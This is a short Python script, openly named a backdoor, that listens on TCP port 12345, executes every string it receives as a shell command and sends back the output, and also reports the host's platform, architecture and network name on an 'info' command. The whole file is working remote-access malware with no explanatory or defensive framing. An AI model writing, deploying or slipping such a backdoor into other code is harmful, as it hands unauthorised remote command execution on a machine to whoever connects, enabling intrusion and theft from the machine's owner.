import socket
import subprocess
import platform

class Backdoor:
    data_size = 2048
    custom_commands = ['info']

    def __init__(self, host, port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client = None
        self.addr = None
        self.socket.bind((host, port))

    def listen(self):
        self.socket.listen(1)
        print(f"==> Backdoor listening on {host}:{port}")

    def run(self):
        if self.listen() is not None:
            self.__stop()
            return
        while True:
            if self.addr is None and self.client is None:
                client_socket, addr = self.socket.accept()
                self.addr = addr
                self.client = client_socket
                print(f"[+] Got a connection from {addr[0]}")
                print("[!] Waiting to receive data from client..")

            data = self.client.recv(self.data_size)

            if not data:
                self.__stop()
                break

            cmd = data.decode('utf-8')

            if cmd not in self.custom_commands:
                output = self.run_command(data.decode('utf-8'))

                if output is not False:
                    self.client.send(output.encode('utf-8'))
                else:
                    msg = f"[-] Cannot execute the command {cmd}"
                    self.client.send(msg.encode('utf-8'))

            if cmd == 'info':
                self.client.send(self.get_platform_info().encode('utf-8'))
                continue

    def run_command(self, cmd):
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return False
    def __stop(self):
        # Close the connection
        self.socket.close()
        print(f"[-] Closing connection {self.addr[0]}")

    def get_platform_info(self):
        info = f"Platform: {platform.system()}\n"
        info += f"Architecture: {platform.architecture()[0]}\n"
        info += f"Machine type: {platform.machine()}\n"
        info += f"Network name: {platform.node()}\n"
        info += f"Processor Info: {platform.processor()}"

        return info

if __name__ == "__main__":
    host = socket.gethostbyname(socket.gethostname())
    port = 12345

    b = Backdoor(host, port)
    b.run()
